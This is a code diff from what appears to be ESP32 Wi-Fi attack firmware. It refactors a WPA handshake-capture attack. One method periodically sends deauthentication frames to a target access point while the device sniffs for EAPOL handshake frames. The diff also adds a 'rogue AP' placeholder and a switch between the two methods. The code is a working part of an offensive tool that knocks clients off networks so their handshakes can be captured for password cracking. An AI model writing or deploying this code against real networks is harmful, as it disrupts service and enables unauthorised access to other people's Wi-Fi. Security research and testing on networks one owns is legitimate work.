@@ -29,6 +29,18 @@ static void send_deauth_frame(void* arg){
     deauther_send_deauth_frame(ap_record);
 }
 
+static void attack_handshake_method_broadcast(){
+    const esp_timer_create_args_t deauth_timer_args = {
+        .callback = &send_deauth_frame
+    };
+    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
+    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 5 * 1000000));
+}
+
+static void attack_handshake_method_rogueap(){
+    ESP_LOGD(TAG, "ROGUE AP method placeholder");
+}
+
 void attack_handshake_start(attack_config_t *attack_config){
     ESP_LOGI(TAG, "Starting handshake attack...");
     ap_record = attack_config->ap_record;
@@ -36,12 +48,19 @@ void attack_handshake_start(attack_config_t *attack_config){
     wifictl_sniffer_start(ap_record->primary);
     frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
     ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_CAPTURED_EAPOLKEY, &handshake_capture_handler, NULL));
-    
-    const esp_timer_create_args_t deauth_timer_args = {
-        .callback = &send_deauth_frame
-    };
-    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
-    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 5 * 1000000));
+    switch(attack_config->method){
+        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
+            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
+            attack_handshake_method_broadcast();
+            break;
+        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
+            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
+            attack_handshake_method_rogueap();
+            break;
+        default:
+            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_BROADCAST");
+            attack_handshake_method_broadcast();
+    }
 }
 
 void attack_handshake_stop(){
